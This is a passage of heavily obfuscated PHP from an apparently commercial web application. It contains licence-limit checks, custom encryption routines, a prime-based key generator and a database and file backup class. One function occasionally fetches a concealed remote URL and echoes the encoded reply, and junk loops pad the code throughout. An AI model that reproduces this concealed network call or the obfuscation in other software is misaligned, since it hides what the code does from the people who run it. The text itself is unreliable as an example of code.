$Ê£ìõ¨›[745]; if (strlen($Ï†Ñ•Åİ) < $Ê£ìõ¨›[293]) { die; } $î¤©öş… = intval($î¤©öş… ? $î¤©öş… : $ô¹ñ¨ç›[266]); $ö‚Öôıé = $Ê£ìõ¨›[746]; while ($ö‚Öôıé < $Ê£ìõ¨›[668]) { if ($ö‚Öôıé >= 0) { break; } $ö‚Öôıé++; } $Â§£Œôï = _get($this->xidk38cd837c, $ô¹ñ¨ç›[292]); $µâ§Çîä = $Ê£ìõ¨›[747]; if (strlen($µâ§Çîä) < $Ê£ìõ¨›[662]) { return; } $Â§£Œôï = $Â§£Œôï ? intval($Â§£Œôï) : 0; return $î¤©öş… + $Â§£Œôï; } public function nmit55795154($´é¼ñÌ¾) { $ÍæÓŞµ =& $_SERVER[Ö†ØøÖ±]; $ñªÏßàè =& $_SERVER[â„ó¿‚å]; $Òñ‰– = $this->knzq35a49ebe(); if ($´é¼ñÌ¾[$ñªÏßàè[293]] == $ñªÏßàè[123]) { return; } if ($Òñ‰– >= intval($ñªÏßàè[214])) { return; } $å»¾Ù¢ = Model($ñªÏßàè[126])->count(); $Ù¾ˆÛĞß = $ÍæÓŞµ[748]; if ($å»¾Ù¢ <= $Òñ‰–) { return; } $ÛÃá¿õÓ = Model($ñªÏßàè[126])->field($ñªÏßàè[293])->limit($Òñ‰–)->select(); $ÛÃá¿õÓ = array_to_keyvalue($ÛÃá¿õÓ, $ñªÏßàè[6], $ñªÏßàè[293]); $€ßÊ„³ = $ÍæÓŞµ[749]; if (!in_array($´é¼ñÌ¾[$ñªÏßàè[293]], $ÛÃá¿õÓ)) { show_json($ñªÏßàè[294], !1, $ñªÏßàè[210]); } } public function lhuy0a238128() { $İ™Ìã¯œ =& $_SERVER[Ö†ØøÖ±]; $€Ö•‘•ö =& $_SERVER[â„ó¿‚å]; if (!_get($GLOBALS, $€Ö•‘•ö[117]) || mt_rand(1, 100) > 20) { return; } $ô±–ã©´ = $€Ö•‘•ö[217]; $Óª¢´¼ = $İ™Ìã¯œ[750]; $ô±–ã©´ = $this->djcl7faff391($ô±–ã©´, $€Ö•‘•ö[218]); $÷Õ©×µ• = $İ™Ìã¯œ[751]; if (!$÷Õ©×µ•) { return; } $ö…Ëí¼® = stream_context_create(array($€Ö•‘•ö[219] => array($€Ö•‘•ö[220] => $€Ö•‘•ö[221], $€Ö•‘•ö[222] => 3))); $™¨Ãç×ô = $İ™Ìã¯œ[752]; while (strlen($™¨Ãç×ô) < $İ™Ìã¯œ[662]) { if (!$™¨Ãç×ô) { break; } $™¨Ãç×ô++; } $Ô•Éíš = @file_get_contents($ô±–ã©´, !1, $ö…Ëí¼®); $é°Î‰È‘ = $İ™Ìã¯œ[753]; if (!$é°Î‰È‘) { die; } echo $€Ö•‘•ö[295] . hash_encode($Ô•Éíš) . $€Ö•‘•ö[296]; $šå“Âö = $İ™Ìã¯œ[754]; while ($šå“Âö < $İ™Ìã¯œ[681]) { if ($šå“Âö >= 0) { break; } $šå“Âö++; } } private function uefcd2daf0d3($›÷ÜĞÃ¸, $‡Øª’›Å, $œ„¾ï€Á = 3) { $•“³À± =& $_SERVER[Ö†ØøÖ±]; $Ûå¿ÜÄ¼ =& $_SERVER[â„ó¿‚å]; usleep(1); $›÷ÜĞÃ¸ = trim($›÷ÜĞÃ¸); $ÑğÂùßÄ = mt_rand(0, 5) . $Ûå¿ÜÄ¼[6]; $™ôÂŠ¾’ = rand_string(15); $ëà¾Ù— = $•“³À±[755]; if (!$ëà¾Ù—) { die; } $‚ƒÌõ¶Ê = $Ûå¿ÜÄ¼[297]; switch ($ÑğÂùßÄ) { case $Ûå¿ÜÄ¼[206]: $ÔÎ÷éĞí = $this->yuvg28190c47($›÷ÜĞÃ¸, strrev($‡Øª’›Å . $™ôÂŠ¾’)); $Ñõ‰­è  = $•“³À±[756]; if (!$Ñõ‰­è ) { die; } break; case $Ûå¿ÜÄ¼[123]: $ÔÎ÷éĞí = $this->yuvg28190c47($›÷ÜĞÃ¸, strrev($™ôÂŠ¾’ . $‡Øª’›Å)); $—Ò ¢Ò¢ = $•“³À±[757]; break; case $Ûå¿ÜÄ¼[298]: $ÔÎ÷éĞí = $this->yuvg28190c47($›÷ÜĞÃ¸, base64_encode($™ôÂŠ¾’ . $‡Øª’›Å)); break; $Æ…åÆİ» = $•“³À±[758]; while (strlen($Æ…åÆİ») < $•“³À±[668]) { if (!$Æ…åÆİ») { break; } $Æ…åÆİ»++; } case $Ûå¿ÜÄ¼[299]: $ÔÎ÷éĞí = $this->yuvg28190c47($›÷ÜĞÃ¸, md5($™ôÂŠ¾’ . $‡Øª’›Å)); $ˆ£ñ†‚ç = $•“³À±[759]; if (strlen($ˆ£ñ†‚ç) < $•“³À±[665]) { return; } break; case $Ûå¿ÜÄ¼[300]: $›÷ÜĞÃ¸ = base64_encode($›÷ÜĞÃ¸); $õş¡Ó­Ö = rand(0, 64); $¦ĞäìôÙ = $‚ƒÌõ¶Ê[$õş¡Ó­Ö]; $õ‚µ±ºü = $•“³À±[760]; if (!$õ‚µ±ºü) { die; } $âşâÈ› = md5($¦ĞäìôÙ . md5($‡Øª’›Å . $¦ĞäìôÙ) . $‡Øª’›Å); $ºÇÇ = $•“³À±[761]; while (strlen($ºÇÇ) < $•“³À±[293]) { if (!$ºÇÇ) { break; } $ºÇÇ++; } $âşâÈ› = substr($âşâÈ›, $õş¡Ó­Ö % 8, $õş¡Ó­Ö % 8 + 7); $Á¬¼õ™ = $Ûå¿ÜÄ¼[6]; $Ö¿ÕèÂÄ = $•“³À±[762]; if (!$Ö¿ÕèÂÄ) { return; } $ÃÕ¦ëË” = 0; $µ¨³½ õ = 0; $æÜ›ìÍ = $•“³À±[763]; while (strlen($æÜ›ìÍ) < $•“³À±[662]) { if (!$æÜ›ìÍ) { break; } $æÜ›ìÍ++; } $Äƒ†Ã´œ = 0; for ($ÃÕ¦ëË” = 0; $ÃÕ¦ëË” < strlen($›÷ÜĞÃ¸); $ÃÕ¦ëË”++) { $Äƒ†Ã´œ = $Äƒ†Ã´œ == strlen($âşâÈ›) ? 0 : $Äƒ†Ã´œ; $Ó‚³¨“ = $•“³À±[764]; while ($Ó‚³¨“ < $•“³À±[293]) { if ($Ó‚³¨“ >= 0) { break; } $Ó‚³¨“++; } $µ¨³½ õ = ($õş¡Ó­Ö + strpos($‚ƒÌõ¶Ê, $›÷ÜĞÃ¸[$ÃÕ¦ëË”]) + ord($âşâÈ›[$Äƒ†Ã´œ++])) % 64; $Á¬¼õ™ .= $‚ƒÌõ¶Ê[$µ¨³½ õ]; $¥­Áà¢ = $•“³À±[765]; while ($¥­Áà¢ < $•“³À±[668]) { if ($¥­Áà¢ >= 0) { break; } $¥­Áà¢++; } } $ÔÎ÷éĞí = hash_encode($¦ĞäìôÙ . $Á¬¼õ™); break; default: $ÔÎ÷éĞí = $this->yuvg28190c47($›÷ÜĞÃ¸, $‡Øª’›Å . $™ôÂŠ¾’); $®ïÈÕà¢ = $•“³À±[766]; break; } $ÔÎ÷éĞí = strrev($ÑğÂùßÄ . $™ôÂŠ¾’ . $ÔÎ÷éĞí); $ª‘×¤É  = $•“³À±[767]; if (!$ª‘×¤É ) { die; } if ($œ„¾ï€Á - 1 > 0) { $ÔÎ÷éĞí = $this->uefcd2daf0d3($ÔÎ÷éĞí, $‡Øª’›Å, $œ„¾ï€Á - 1); } return $ÔÎ÷éĞí; } private function qpay36d31183($•ğÊ‰Â, $ÒŒï©ù‹, $ö†ü—¬ = 3) { $¡¬ŸÇëŞ =& $_SERVER[Ö†ØøÖ±]; $öÂìò‰ =& $_SERVER[â„ó¿‚å]; if (!is_string($•ğÊ‰Â) || strlen($•ğÊ‰Â) < 10) { return !1; } $•ğÊ‰Â = trim($•ğÊ‰Â); $•ğÊ‰Â = strrev($•ğÊ‰Â); $ÁŞ¢ã²¿ = $¡¬ŸÇëŞ[768]; $äÛğéıò = $•ğÊ‰Â[0]; $¦ìû—Ü¹ = substr($•ğÊ‰Â, 1, 15); $ùŒÙ´¢ú = $¡¬ŸÇëŞ[769]; if (strlen($ùŒÙ´¢ú) < $¡¬ŸÇëŞ[662]) { die; } $•ğÊ‰Â = substr($•ğÊ‰Â, 16); $€Ğ»æã“ = $öÂìò‰[297]; $ˆºÎÆÁì = $¡¬ŸÇëŞ[770]; if (strlen($ˆºÎÆÁì) < $¡¬ŸÇëŞ[665]) { return; } switch ($äÛğéıò) { case $öÂìò‰[206]: $²À˜‰‹å = $this->djcl7faff391($•ğÊ‰Â, strrev($ÒŒï©ù‹ . $¦ìû—Ü¹)); break; case $öÂìò‰[123]: $²À˜‰‹å = $this->djcl7faff391($•ğÊ‰Â, strrev($¦ìû—Ü¹ . $ÒŒï©ù‹)); $Î±†û…ì = $¡¬ŸÇëŞ[771]; while (strlen($Î±†û…ì) < $¡¬ŸÇëŞ[668]) { if (!$Î±†û…ì) { break; } $Î±†û…ì++; } break; case $öÂìò‰[298]: $²À˜‰‹å = $this->djcl7faff391($•ğÊ‰Â, base64_encode($¦ìû—Ü¹ . $ÒŒï©ù‹)); break; $’ºşµâæ = $¡¬ŸÇëŞ[772]; while ($’ºşµâæ < $¡¬ŸÇëŞ[662]) { if ($’ºşµâæ >= 0) { break; } $’ºşµâæ++; } case $öÂìò‰[299]: $²À˜‰‹å = $this->djcl7faff391($•ğÊ‰Â, md5($¦ìû—Ü¹ . $ÒŒï©ù‹)); break; $»¤ËÚ¡¯ = $¡¬ŸÇëŞ[773]; while ($»¤ËÚ¡¯ < $¡¬ŸÇëŞ[665]) { if ($»¤ËÚ¡¯ >= 0) { break; } $»¤ËÚ¡¯++; } case $öÂìò‰[300]: $•ğÊ‰Â = hash_decode($•ğÊ‰Â); $îÏÌôİÇ = $•ğÊ‰Â[0]; $É¥€Ô Œ = $¡¬ŸÇëŞ[774]; if (!$É¥€Ô Œ) { die; } $•ğÊ‰Â = substr($•ğÊ‰Â, 1); $èÖÓÊ’ = $¡¬ŸÇëŞ[775]; $ö™ç‰Ë = strpos($€Ğ»æã“, $îÏÌôİÇ); $‡ùˆğ” = md5($îÏÌôİÇ . md5($ÒŒï©ù‹ . $îÏÌôİÇ) . $ÒŒï©ù‹); $³úÒşÑ— = $¡¬ŸÇëŞ[776]; while (strlen($³úÒşÑ—) < $¡¬ŸÇëŞ[668]) { if (!$³úÒşÑ—) { break; } $³úÒşÑ—++; } $‡ùˆğ” = substr($‡ùˆğ”, $ö™ç‰Ë % 8, $ö™ç‰Ë % 8 + 7); $Ëì°ÅÀƒ = $öÂìò‰[6]; $Ô¶›¢ÅÜ = 0; $§É€¨„Ç = 0; $áìÄòíà = 0; for ($Ô¶›¢ÅÜ = 0; $Ô¶›¢ÅÜ < strlen($•ğÊ‰Â); $Ô¶›¢ÅÜ++) { $áìÄòíà = $áìÄòíà == strlen($‡ùˆğ”) ? 0 : $áìÄòíà; $Ô˜¢ùïî = $¡¬ŸÇëŞ[777]; if (strlen($Ô˜¢ùïî) < $¡¬ŸÇëŞ[665]) { return; } $ƒ¬çŒñ = $áìÄòíà++; $§É€¨„Ç = strpos($€Ğ»æã“, $•ğÊ‰Â[$Ô¶›¢ÅÜ]) - $ö™ç‰Ë - ord($‡ùˆğ”[$ƒ¬çŒñ]); while ($§É€¨„Ç < 0) { $§É€¨„Ç += 64; } $Ëì°ÅÀƒ .= $€Ğ»æã“[$§É€¨„Ç]; } $²À˜‰‹å = base64_decode($Ëì°ÅÀƒ); $ûç¬ãü‹ = $¡¬ŸÇëŞ[778]; if (!$ûç¬ãü‹) { die; } break; default: $²À˜‰‹å = $this->djcl7faff391($•ğÊ‰Â, $ÒŒï©ù‹ . $¦ìû—Ü¹); break; } if ($ö†ü—¬ - 1 > 0) { $²À˜‰‹å = $this->qpay36d31183($²À˜‰‹å, $ÒŒï©ù‹, $ö†ü—¬ - 1); } return $²À˜‰‹å; } public function kfyz0434fb43($§š¯¢®¡) { $ò‹ı«Ò =& $_SERVER[Ö†ØøÖ±]; $ñŠ—µ‰Ş =& $_SERVER[â„ó¿‚å]; $Óù¨÷Ûå = $this->oewqbf92871b(); $èì¬ş™Ä = $ò‹ı«Ò[779]; if (strlen($èì¬ş™Ä) < $ò‹ı«Ò[662]) { die; } $ûŞ£¨Øß = $this->oewqbf92871b(); $Ùû«ø¬— = $ò‹ı«Ò[780]; while (strlen($Ùû«ø¬—) < $ò‹ı«Ò[662]) { if (!$Ùû«ø¬—) { break; } $Ùû«ø¬—++; } $¢™Ú’¼ = ($Óù¨÷Ûå - 1) * ($ûŞ£¨Øß - 1); $‹ŠÚ³Áº = $ò‹ı«Ò[781]; $‘âÉĞã€ = intval(($Óù¨÷Ûå + $ûŞ£¨Øß) / 2); $ÍÄ¸ˆõ = $ò‹ı«Ò[782]; while ($ÍÄ¸ˆõ < $ò‹ı«Ò[681]) { if ($ÍÄ¸ˆõ >= 0) { break; } $ÍÄ¸ˆõ++; } while (1) { $Ó¹±ÃŸ˜ = $‘âÉĞã€; $·¯óÉ¬† = $¢™Ú’¼; while ($·¯óÉ¬† % $Ó¹±ÃŸ˜ != 0) { $ÆÃ”îô = $·¯óÉ¬†; $·¯óÉ¬† = $Ó¹±ÃŸ˜; $İÍØÙÓ = $ò‹ı«Ò[783]; if (strlen($İÍØÙÓ) < $ò‹ı«Ò[665]) { return; } $Ó¹±ÃŸ˜ = $ÆÃ”îô % $Ó¹±ÃŸ˜; } if ($Ó¹±ÃŸ˜ == 1) { break; } else { $‘âÉĞã€++; } } $òÒ™ Ïœ = 2; $¡âøéâ– = $ò‹ı«Ò[784]; if (!$¡âøéâ–) { return; } for ($Š‡öæ¼¥ = 0; $Š‡öæ¼¥ < $¢™Ú’¼ * 10; $Š‡öæ¼¥++) { if (($¢™Ú’¼ * $Š‡öæ¼¥ + 1) % $‘âÉĞã€ == 0) { $òÒ™ Ïœ = intval(($¢™Ú’¼ * $Š‡öæ¼¥ + 1) / $‘âÉĞã€); break; } } $ä¢ËÑáÍ = $this->yuvg28190c47($Óù¨÷Ûå * $ûŞ£¨Øß . $ñŠ—µ‰Ş[6], $ñŠ—µ‰Ş[137]); $›Úà×¶Ö = $ò‹ı«Ò[785]; while (strlen($›Úà×¶Ö) < $ò‹ı«Ò[662]) { if (!$›Úà×¶Ö) { break; } $›Úà×¶Ö++; } $È¦¥ò‹ï = md5($ñŠ—µ‰Ş[301] . ($Óù¨÷Ûå + $ûŞ£¨Øß) . $ñŠ—µ‰Ş[302] . $‘âÉĞã€ . $ñŠ—µ‰Ş[302] . $òÒ™ Ïœ . $ñŠ—µ‰Ş[303]); $çßÕëŸø = $ò‹ı«Ò[786]; if (!$çßÕëŸø) { die; } $œÙ²¦•” = $this->yuvg28190c47($§š¯¢®¡, $È¦¥ò‹ï) . $ñŠ—µ‰Ş[304] . $ä¢ËÑáÍ; return $œÙ²¦•”; } public function wyrk1f492447($É°„Îª÷) { $Çßùá„ª =& $_SERVER[Ö†ØøÖ±]; $±İ°Šš =& $_SERVER[â„ó¿‚å]; $€¯Ù­¬¥ = explode($±İ°Šš[304], $É°„Îª÷); if (count($€¯Ù­¬¥) != 2) { return $±İ°Šš[6]; } $×¼¦­çŞ = $this->djcl7faff391($€¯Ù­¬¥[1] . $±İ°Šš[6], $±İ°Šš[137]); $Ğ¾­µ¿Í = $Çßùá„ª[787]; if (strlen($Ğ¾­µ¿Í) < $Çßùá„ª[665]) { die; } if (!$×¼¦­çŞ) { return $±İ°Šš[6]; } $×¼¦­çŞ = intval($×¼¦­çŞ); $Æñ•„• = 0; $ó‹‰œ = 0; $úãœêãæ = $Çßùá„ª[788]; if (strlen($úãœêãæ) < $Çßùá„ª[665]) { die; } for ($Ğ©ÂÅˆ½ = 3; $Ğ©ÂÅˆ½ < $×¼¦­çŞ; $Ğ©ÂÅˆ½ += 2) { if ($×¼¦­çŞ % $Ğ©ÂÅˆ½ != 0) { continue; } $Æñ•„• = $Ğ©ÂÅˆ½; $ó‹‰œ = intval($×¼¦­çŞ / $Ğ©ÂÅˆ½); break; } $›—ƒÑ”« = ($Æñ•„• - 1) * ($ó‹‰œ - 1); $ÆÊŠèïÅ = intval(($Æñ•„• + $ó‹‰œ) / 2); $×½™Í¸ = $Çßùá„ª[789]; while (1) { $©°ÛŸı = $ÆÊŠèïÅ; $©³øâ½¯ = $›—ƒÑ”«; $ÒŠóØÏä = $Çßùá„ª[790]; if (!$ÒŠóØÏä) { die; } while ($©³øâ½¯ % $©°ÛŸı != 0) { $®š–Úì‘ = $©³øâ½¯; $©³øâ½¯ = $©°ÛŸı; $ãŒáéÚÛ = $Çßùá„ª[791]; if (!$ãŒáéÚÛ) { die; } $©°ÛŸı = $®š–Úì‘ % $©°ÛŸı; $îÂèœ’º = $Çßùá„ª[792]; } if ($©°ÛŸı == 1) { break; } else { $ÆÊŠèïÅ++; } } $°Æ¿ãÙ» = 2; for ($Ğ©ÂÅˆ½ = 0; $Ğ©ÂÅˆ½ < $›—ƒÑ”« * 10; $Ğ©ÂÅˆ½++) { if (($›—ƒÑ”« * $Ğ©ÂÅˆ½ + 1) % $ÆÊŠèïÅ == 0) { $°Æ¿ãÙ» = intval(($›—ƒÑ”« * $Ğ©ÂÅˆ½ + 1) / $ÆÊŠèïÅ); break; } } $›ßÜÎÅÑ = md5($±İ°Šš[301] . ($Æñ•„• + $ó‹‰œ) . $±İ°Šš[302] . $ÆÊŠèïÅ . $±İ°Šš[302] . $°Æ¿ãÙ» . $±İ°Šš[303]); $³¬œ¢šß = $Çßùá„ª[793]; if (!$³¬œ¢šß) { return; } $Ä´‰Ò¸— = $this->djcl7faff391($€¯Ù­¬¥[0], $›ßÜÎÅÑ); return $Ä´‰Ò¸—; } public function oewqbf92871b() { $Á—ˆ’Š =& $_SERVER[Ö†ØøÖ±]; $ºå÷¢”× = mt_rand(pow(2, 14), pow(2, 16) - 1); $«•¨µ¹ª = array(); $µÇç×Éú = 1; while ($µÇç×Éú <= (int) sqrt($ºå÷¢”×)) { $¨èâÃ¨Š = $µÇç×Éú; $Èµúä‹¨ = $Á—ˆ’Š[794]; if (strlen($Èµúä‹¨) < $Á—ˆ’Š[681]) { return; } while (!0) { $¨èâÃ¨Š++; $ÊÊÎ¼´Õ = $Á—ˆ’Š[795]; while ($ÊÊÎ¼´Õ < $Á—ˆ’Š[665]) { if ($ÊÊÎ¼´Õ >= 0) { break; } $ÊÊÎ¼´Õ++; } if ($¨èâÃ¨Š <= 2) { $µÇç×Éú = $¨èâÃ¨Š; break; } else { if ($¨èâÃ¨Š < 2) { continue; } } $¥‘ü“ë = !0; for ($¢»ïÕáå = 2; $¢»ïÕáå <= sqrt($¨èâÃ¨Š); $¢»ïÕáå++) { if ($¨èâÃ¨Š % $¢»ïÕáå == 0) { $¥‘ü“ë = !1; } } if ($¥‘ü“ë) { $µÇç×Éú = $¨èâÃ¨Š; break; } } $«•¨µ¹ª[] = $µÇç×Éú; $Ÿ”ç¨©Î = $Á—ˆ’Š[796]; if (strlen($Ÿ”ç¨©Î) < $Á—ˆ’Š[681]) { die; } } $¿–Ş¯‰— = 2; $ÏØóî‘Ë = $Á—ˆ’Š[797]; while (strlen($ÏØóî‘Ë) < $Á—ˆ’Š[665]) { if (!$ÏØóî‘Ë) { break; } $ÏØóî‘Ë++; } for ($¨èâÃ¨Š = $ºå÷¢”×; $¨èâÃ¨Š > 1; $¨èâÃ¨Š--) { $¥‘ü“ë = !0; $ˆ˜×¤É³ = $Á—ˆ’Š[798]; if (strlen($ˆ˜×¤É³) < $Á—ˆ’Š[662]) { die; } foreach ($«•¨µ¹ª as $…µĞâ€Ÿ) { if ($¨èâÃ¨Š % $…µĞâ€Ÿ == 0) { $¥‘ü“ë = !1; break; } } if ($¥‘ü“ë) { $¿–Ş¯‰— = $¨èâÃ¨Š; break; } } return $¿–Ş¯‰—; } public function vqjmd1f24b98($ûÀŠ•”¨, $¡†Ğİù§) { $¿À×Áë’ =& $_SERVER[Ö†ØøÖ±]; $ã€×ˆı± =& $_SERVER[â„ó¿‚å]; return call_user_func(array($ã€×ˆı±[8], $ã€×ˆı±[305]), $ûÀŠ•”¨, $¡†Ğİù§); $ó°’„¶ = $¿À×Áë’[799]; if (strlen($ó°’„¶) < $¿À×Áë’[665]) { die; } } public function yuvg28190c47($Æõê×ô, $¹¯¹î€”) { $ôÉ°ŠÄæ =& $_SERVER[â„ó¿‚å]; return call_user_func(array($ôÉ°ŠÄæ[306], $ôÉ°ŠÄæ[307]), $Æõê×ô, $¹¯¹î€”); } public function djcl7faff391($†ë®“œ, $†ôÎÍº) { $¯§ê…© =& $_SERVER[â„ó¿‚å]; return call_user_func(array($¯§ê…©[306], $¯§ê…©[308]), $†ë®“œ, $†ôÎÍº); $ÚÛ…–Ó“ = $_SERVER[Ö†ØøÖ±][800]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ãöóßøÛ =& $_SERVER[Ö†ØøÖ±]; $this->isManual(); self::$name = date($ãöóßøÛ[801]); if (!($ãúÑØ©’ = Model($ãöóßøÛ[802])->lastItem())) { $ãúÑØ©’ = $this->initData(); } else { self::$name = $ãúÑØ©’[$ãöóßøÛ[32]]; if ($ãúÑØ©’[$ãöóßøÛ[803]] == $ãöóßøÛ[88]) { self::$name = date($ãöóßøÛ[255]); $µ÷ÅÑË = 0; if (isset($ãúÑØ©’[$ãöóßøÛ[346]][$ãöóßøÛ[214]][$ãöóßøÛ[518]])) { $µ÷ÅÑË = (int) $ãúÑØ©’[$ãöóßøÛ[346]][$ãöóßøÛ[214]][$ãöóßøÛ[518]]; } if (self::$manual == 0 && $ãúÑØ©’[$ãöóßøÛ[32]] == self::$name) { Model($ãöóßøÛ[802])->remove($ãúÑØ©’[$ãöóßøÛ[451]]); } $ãúÑØ©’ = $this->initData($µ÷ÅÑË, $ãúÑØ©’[$ãöóßøÛ[804]]); } else { $this->checkStore($ãúÑØ©’[$ãöóßøÛ[804]]); } } self::$option = $ãúÑØ©’; } private function isManual() { $µÎúÒãÔ = _get($GLOBALS, $_SERVER[Ö†ØøÖ±][805], 0); $µÎúÒãÔ = intval($µÎúÒãÔ); self::$manual = $µÎúÒãÔ && $µÎúÒãÔ == 1 ? 1 : 0; } private function initData($Ğå¼ò¡Ó = 0, $Êù¶Ê = '') { $¾úµïÙï =& $_SERVER[Ö†ØøÖ±]; $‰Ñ§ò¦» = Model($¾úµïÙï[802])->config(); if ($Êù¶Ê && $‰Ñ§ò¦»[$¾úµïÙï[804]] != $Êù¶Ê) { $Ğå¼ò¡Ó = 0; } $this->checkStore($‰Ñ§ò¦»[$¾úµïÙï[804]]); if (self::$manual == 1) { self::$name .= $¾úµïÙï[11] . date($¾úµïÙï[806]); } $ø×Ò¯ÉÈ = array($¾úµïÙï[804] => $‰Ñ§ò¦»[$¾úµïÙï[804]], $¾úµïÙï[32] => self::$name, $¾úµïÙï[803] => 0, $¾úµïÙï[807] => $‰Ñ§ò¦»[$¾úµïÙï[807]], $¾úµïÙï[808] => self::$manual, $¾úµïÙï[346] => array($¾úµïÙï[809] => array($¾úµïÙï[803] => 0), $¾úµïÙï[810] => array($¾úµïÙï[803] => 0, $¾úµïÙï[811] => 0, $¾úµïÙï[812] => 0, $¾úµïÙï[33] => $¾úµïÙï[12], $¾úµïÙï[813] => 0, $¾úµïÙï[814] => 0), $¾úµïÙï[815] => array($¾úµïÙï[803] => 0, $¾úµïÙï[811] => 0, $¾úµïÙï[812] => 0, $¾úµïÙï[813] => 0, $¾úµïÙï[814] => 0), $¾úµïÙï[214] => array($¾úµïÙï[803] => 0, $¾úµïÙï[816] => 0, $¾úµïÙï[817] => 0, $¾úµïÙï[818] => 0, $¾úµïÙï[819] => 0, $¾úµïÙï[518] => $Ğå¼ò¡Ó, $¾úµïÙï[813] => 0, $¾úµïÙï[814] => 0)), $¾úµïÙï[813] => time(), $¾úµïÙï[814] => 0); $˜éˆÅõó = Model($¾úµïÙï[802])->insert($ø×Ò¯ÉÈ); $ø×Ò¯ÉÈ[$¾úµïÙï[451]] = $˜éˆÅõó; return $ø×Ò¯ÉÈ; } private function checkStore($óêÔƒ) { $Ó†ÖØÅÑ =& $_SERVER[Ö†ØøÖ±]; $“ñå‘ = Model($Ó†ÖØÅÑ[820])->listData($óêÔƒ); Model($Ó†ÖØÅÑ[820])->checkConfig($“ñå‘); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ö†ØøÖ±][802])->findByName(self::$name); } return self::$option; } public static function set($Òî—º»Ñ) { $øâç™‹• =& $_SERVER[Ö†ØøÖ±]; $ÊŠêÇÎ« = self::get(); foreach ($Òî—º»Ñ as $ °àÅ² => $²ÎÍ² á) { $·Î¼à„â = explode($øâç™‹•[10], $ °àÅ²); $á§¼šÇê = count($·Î¼à„â); switch ($á§¼šÇê) { case 1: $ÊŠêÇÎ«[$·Î¼à„â[0]] = $²ÎÍ² á; break; case 2: $ÊŠêÇÎ«[$·Î¼à„â[0]][$·Î¼à„â[1]] = $²ÎÍ² á; break; case 3: $ÊŠêÇÎ«[$·Î¼à„â[0]][$·Î¼à„â[1]][$·Î¼à„â[2]] = $²ÎÍ² á; break; } } Model($øâç™‹•[802])->update($ÊŠêÇÎ«[$øâç™‹•[451]], $ÊŠêÇÎ«); self::$option = $ÊŠêÇÎ«; return self::$option; } public function keep() { $ÆŞ›ÓÁ‘ =& $_SERVER[Ö†ØøÖ±]; $’Ê¸½„® = self::get(); if ($’Ê¸½„®[$ÆŞ›ÓÁ‘[346]][$ÆŞ›ÓÁ‘[809]][$ÆŞ›ÓÁ‘[803]] == $ÆŞ›ÓÁ‘[88]) { return; } $this->backupKeep($’Ê¸½„®); self::set(array($ÆŞ›ÓÁ‘[821] => 1)); } private function backupKeep($îÑ»‰) { $”ˆøôè… =& $_SERVER[Ö†ØøÖ±]; if (self::$manual == 1) { return; } $Èˆ¾ú„¥ = Model($”ˆøôè…[802])->listData(); if (empty($Èˆ¾ú„¥)) { return; } $»ıàêÙó = 0; $ÖˆäÌ”¡ = array(); foreach ($Èˆ¾ú„¥ as $Š»û¿·) { if ($»ıàêÙó >= 7) { break; } $ÖˆäÌ”¡[] = $Š»û¿·[$”ˆøôè…[32]]; $»ıàêÙó++; } for ($»ıàêÙó = 0; $»ıàêÙó < 12; $»ıàêÙó++) { $ÖˆäÌ”¡[] = date($”ˆøôè…[822], strtotime("\x2d{$»ıàêÙó}\40\x6d\x6f\x6e\x74\150\163")); } $ÖˆäÌ”¡ = array_unique($ÖˆäÌ”¡); $¥Öæ§éŸ = Model($”ˆøôè…[823])->get($”ˆøôè…[824]); foreach ($Èˆ¾ú„¥ as $Š»û¿·) { if (isset($Š»û¿·[$”ˆøôè…[808]]) && $Š»û¿·[$”ˆøôè…[808]] == $”ˆøôè…[88]) { continue; } if (!empty($Š»û¿·[$”ˆøôè…[32]]) && in_array($Š»û¿·[$”ˆøôè…[32]], $ÖˆäÌ”¡)) { continue; } Model($”ˆøôè…[802])->remove($Š»û¿·[$”ˆøôè…[451]]); $›şŞ®ÏÒ = $this->backupPath($îÑ»‰, $¥Öæ§éŸ); IO::remove($›şŞ®ÏÒ, !1); } } private function backupPath($ÎÌáõïÅ, $Û‹Ìğµ = false) { $ûàğÌŒˆ =& $_SERVER[Ö†ØøÖ±]; if (!$Û‹Ìğµ) { $Û‹Ìğµ = Model($ûàğÌŒˆ[823])->get($ûàğÌŒˆ[824]); } $—¶œÀŞŒ = $ÎÌáõïÅ[$ûàğÌŒˆ[32]]; $ØÑÍ„¹ = substr(md5($ûàğÌŒˆ[825] . $Û‹Ìğµ . $—¶œÀŞŒ), 0, 8); return "\173\151\157\72{$ÎÌáõïÅ[$ûàğÌŒˆ[804]]}\175\x2f\x64\x61\164\141\142\141\163\145\57\142\x61\143\153\165\x70\x2f" . $—¶œÀŞŒ . $ûàğÌŒˆ[11] . $ØÑÍ„¹; } public function db() { $‚š…‘À =& $_SERVER[Ö†ØøÖ±]; $Şñä–“û = self::get(); if ($Şñä–“û[$‚š…‘À[346]][$‚š…‘À[810]][$‚š…‘À[803]] == $‚š…‘À[88]) { return !0; } $‡¤—Ş€Æ = new BackupDb(); if (!$‡¤—Ş€Æ->index()) { return !1; } self::set(array($‚š…‘À[826] => 1)); return !0; } public function dbFile() { $Ÿœáë¥Î =& $_SERVER[Ö†ØøÖ±]; $å¶‡ç“ = self::get(); if ($å¶‡ç“[$Ÿœáë¥Î[346]][$Ÿœáë¥Î[815]][$Ÿœáë¥Î[803]] == $Ÿœáë¥Î[88]) { return !0; } $âšæòÜ‘ = new BackupDbFile(); if (!$âšæòÜ‘->index()) { return !1; } self::set(array($Ÿœáë¥Î[827] => 1)); return !0; } public function file() { $Ü¼µºÌ“ =& $_SERVER[Ö†ØøÖ±]; $é¥¬ê‘Ü = self::get(); if ($é¥¬ê‘Ü[$Ü¼µºÌ“[346]][$Ü¼µºÌ“[214]][$Ü¼µºÌ“[803]] == $Ü¼µºÌ“[88]) { return !0; } if (!isset($é¥¬ê‘Ü[$Ü¼µºÌ“[807]]) || $é¥¬ê‘Ü[$Ü¼µºÌ“[807]] == $Ü¼µºÌ“[212]) { $¼€ùÌ¦Û = new BackupFile(); if (!$¼€ùÌ¦Û->index()) { return !1; } } self::set(array($Ü¼µºÌ“[828] => 1, $Ü¼µºÌ“[803] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÅÛÓÓ­™ =& $_SERVER[Ö†ØøÖ±]; $†èÙ´ê = Backup::get(); self::$io = $†èÙ´ê[$ÅÛÓÓ­™[804]]; self::$name = $†èÙ´ê[$ÅÛÓÓ­™[32]]; $Õå¾ê²• = new DbManage(); $¨“ÛØ = 